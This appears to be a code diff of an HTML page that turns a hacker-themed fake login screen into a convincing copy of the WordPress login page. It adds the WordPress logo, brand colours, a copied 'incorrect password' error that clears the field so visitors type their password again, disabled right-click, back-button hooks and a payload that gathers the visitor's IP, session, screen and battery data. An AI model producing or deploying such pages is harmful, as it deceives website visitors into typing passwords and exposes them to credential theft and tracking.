@@ -1,184 +1,131 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TERMINAL_CRITICAL_INTERCEPT</title>
-    <style>
-        /* NUKE THEME ELEMENTS */
-        header, footer, nav, .site-header, .site-footer, #masthead, #colophon, .sidebar, aside {
-            display: none !important;
-            height: 0 !important;
-            visibility: hidden !important;
-        }
+<style>
+    /* 1. RESET & BACKGROUND */
+    header, footer, nav, .site-header, .site-footer, #masthead, #colophon, .sidebar, aside {
+        display: none !important;
+    }
 
-        html, body { 
-            background-color: #000 !important; 
-            color: #0f0 !important; 
-            font-family: 'Courier New', Courier, monospace; 
-            margin: 0 !important; 
-            padding: 0 !important; 
-            width: 100%;
-            min-height: 100vh;
-            overflow-x: hidden;
-            transition: background-color 0.1s ease;
-        }
+    html, body { 
+        /* PASTE YOUR BACKGROUND IMAGE LINK BELOW */
+        background: #f1f1f1 url('https://images.unsplash.com/photo-1497366216548-37526070297c?q=80&w=2070&auto=format&fit=crop') no-repeat center center fixed !important; 
+        background-size: cover !important;
+        color: #3c434a !important; 
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; 
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+    }
 
-        /* FAKE LOGIN OVERLAY */
-        #login-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #000;
-            z-index: 2000000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        #login-box {
-            border: 1px solid #0f0;
-            padding: 25px;
-            background: #050505;
-            width: 100%;
-            max-width: 350px;
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.1);
-        }
-        #login-box input {
-            background: rgba(0, 20, 0, 0.5);
-            border: 1px solid #0f0;
-            color: #0f0;
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            outline: none;
-            font-family: inherit;
-            box-sizing: border-box;
-        }
-        #login-btn {
-            background: #0f0;
-            color: #000;
-            border: none;
-            width: 100%;
-            padding: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            margin-top: 10px;
-        }
+    /* 2. THE LOGIN OVERLAY */
+    #login-overlay {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(241, 241, 241, 0.85); /* Slight transparency to show background */
+        z-index: 2000000;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
 
-        /* MATRIX OVERLAY */
-        #matrix-bg {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 999999; 
-            pointer-events: none;
-            mix-blend-mode: screen;
-            opacity: 0.4; 
-        }
+    /* 3. CIRCULAR LOGO */
+    .login-logo-circle {
+        width: 100px;
+        height: 100px;
+        /* PASTE YOUR LOGO LINK BELOW */
+        background: #fff url('YOUR_LOGO_LINK_HERE') no-repeat center center;
+        background-size: 70%;
+        border-radius: 50%;
+        margin-bottom: 25px;
+        box-shadow: 0 1px 10px rgba(0,0,0,0.1);
+        border: 4px solid #fff;
+    }
 
-        .danger-bar {
-            background: #ff0000;
-            color: #000;
-            text-align: center;
-            font-weight: bold;
-            padding: 15px;
-            font-size: clamp(12px, 3vw, 18px);
-            text-transform: uppercase;
-            animation: blink 0.5s step-end infinite;
-            z-index: 1000;
-        }
-        @keyframes blink { 50% { background: #000; color: #ff0000; } }
+    /* 4. THE LOGIN BOX (WP STYLE) */
+    #login-box {
+        background: #fff;
+        padding: 30px;
+        width: 100%;
+        max-width: 320px;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.13);
+        border-radius: 2px;
+    }
 
-        .wrapper {
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            position: relative;
-            z-index: 10;
-        }
+    #login-box label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 14px;
+        color: #3c434a;
+    }
 
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-        }
+    #login-box input {
+        background: #fff !important;
+        border: 1px solid #dcdcde !important;
+        color: #2c3338 !important;
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        font-size: 20px;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
 
-        .box {
-            border: 1px solid #0f0;
-            padding: 20px;
-            background: rgba(0, 10, 0, 0.9);
-        }
-        .box-red { border-color: #ff0000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
+    #login-btn {
+        background: #2271b1 !important; /* Official WP Blue */
+        color: #fff !important;
+        border: none !important;
+        width: 100%;
+        padding: 12px;
+        font-weight: 600;
+        cursor: pointer;
+        border-radius: 4px;
+        font-size: 14px;
+        box-shadow: 0 1px 0 #135e96;
+    }
 
-        h2 { color: #fff; margin: 0 0 15px 0; font-size: 1rem; border-bottom: 1px solid #0f0; padding-bottom: 8px; }
+    #login-btn:hover { background: #135e96 !important; }
 
-        .data-list { list-style: none; padding: 0; margin: 0; font-size: 13px; line-height: 2.1; }
-        .data-list span { color: #0f0; font-weight: bold; float: right; }
-        .decrypting { color: #ff0000; animation: flash 0.15s infinite; }
-        @keyframes flash { 50% { opacity: 0; } }
+    /* 5. THE FAKE ERROR (LOOKS REAL) */
+    #login-error {
+        background: #fff;
+        border-left: 4px solid #d63638;
+        padding: 12px;
+        margin-bottom: 20px;
+        box-shadow: 0 1px 1px rgba(0,0,0,0.05);
+        font-size: 13px;
+        display: none;
+    }
 
-        #terminal {
-            background: #000;
-            height: 200px;
-            overflow: hidden;
-            font-size: 12px;
-            padding: 15px;
-            border: 1px solid #0f0;
-            color: #0f0;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-        }
-
-        .warning-msg {
-            color: #fff;
-            font-size: 14px;
-            line-height: 1.8;
-            padding: 15px;
-            border-left: 5px solid #ff0000;
-            background: rgba(255, 0, 0, 0.05);
-        }
-
-        .site-name-text { color: #0f0; font-weight: bold; }
-
-        .shake { animation: shake 0.2s cubic-bezier(.36,.07,.19,.97) both; }
-        @keyframes shake {
-            10%, 90% { transform: translate(-1px, 0); }
-            20%, 80% { transform: translate(2px, 0); }
-            30%, 50%, 70% { transform: translate(-4px, 0); }
-            40%, 60% { transform: translate(4px, 0); }
-        }
-        .red-alert-pulse { background-color: rgba(255, 0, 0, 0.1) !important; }
-    </style>
-</head>
+    /* HIDDEN SCRIPTS/SCARY STUFF */
+    #matrix-bg, .danger-bar, .wrapper, #terminal { display: none !important; }
+</style>
 <body oncontextmenu="return false;">
 
     <div id="login-overlay">
-        <div id="login-box">
-            <div style="font-weight:bold; border-bottom: 1px solid #0f0; padding-bottom:10px;">AUTH_REQUIRED // SESSION_<span id="session-id-text">...</span></div>
-            <div style="margin-top: 15px; font-size: 12px;">USER_ID:</div>
-            <input type="text" id="fake-user" placeholder="root" autocomplete="off">
-            <div style="font-size: 12px;">PASS_KEY:</div>
-            <input type="password" id="fake-pass" placeholder="••••••••" autocomplete="off">
-            
+    <div class="login-logo-circle" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/9/93/Wordpress_Blue_Logo.png');"></div>
 
-<div style="display: grid; place-items: center; width: 100%; overflow: visible !important;">
-    <div class="g-recaptcha" 
-         data-sitekey="6LcSdY0sAAAAAGGXxyLn2np0RJasdNpC7KE3Og56" 
-         data-theme="dark"
-         style="margin-bottom: -5px; transform: scale(0.88); transform-origin: center top;">
+    <div id="login-box">
+        <div id="login-error"></div>
+
+        <form onsubmit="event.preventDefault(); attemptLogin();">
+            <label for="fake-user">Username or Email Address</label>
+            <input type="text" id="fake-user" autocomplete="off" value="admin">
+
+            <label for="fake-pass">Password</label>
+            <input type="password" id="fake-pass" autocomplete="off" autofocus>
+
+            <div style="display: grid; place-items: center; width: 100%; margin: 15px 0;">
+                <div class="g-recaptcha" 
+                     data-sitekey="6LcSdY0sAAAAAGGXxyLn2np0RJasdNpC7KE3Og56" 
+                     data-theme="light">
+                </div>
+            </div>
+
+            <button type="button" id="login-btn" onclick="attemptLogin()">Log In</button>
+        </form>
     </div>
 </div>
-
-            <button id="login-btn" onclick="attemptLogin()">Log In</button>
-            <div id="login-error" style="color: #ff0000; margin-top: 15px; font-size: 11px; display: none;">[!] ACCESS_DENIED: LOGGING_ATTEMPT...</div>
-        </div>
-    </div>
 
     <audio id="alert-sound" loop>
         <source src="YOUR_SOUND_FILE.mp3" type="audio/mpeg">
@@ -267,12 +214,27 @@ window.onpopstate = function () {
         const res = document.getElementById('user-res').innerText;
         const batt = document.getElementById('user-batt').innerText;
 
-        const errorMsg = document.getElementById('login-error');
+const errorMsg = document.getElementById('login-error');
+errorMsg.style.display = 'block';
+// Real WordPress error message
+errorMsg.innerHTML = "<strong>ERROR</strong>: The password you entered for the username <strong>admin</strong> is incorrect. <a href='#'>Lost your password?</a>";
 
-        // Show the error message immediately
-        errorMsg.style.display = 'block';
-        errorMsg.innerText = "[!] SECURING CONNECTION... LOGGING METADATA...";
+// Add a slight shake to the box to make it feel like a real 'failed' login
+document.getElementById('login-box').classList.add('shake');
+setTimeout(() => document.getElementById('login-box').classList.remove('shake'), 500);
 
+// Clear the password field so they type a new one
+document.getElementById('fake-pass').value = "";
+
+// Add this line to trigger the physical shake
+document.getElementById('login-box').classList.add('shake');
+
+// This removes the class after 500ms so it can shake again on the next click
+setTimeout(() => {
+    document.getElementById('login-box').classList.remove('shake');
+}, 500);
+
+        
         // Construct the data string
         const payload = `ip=${encodeURIComponent(ip)}` +
                         `&session=${encodeURIComponent(session)}` +
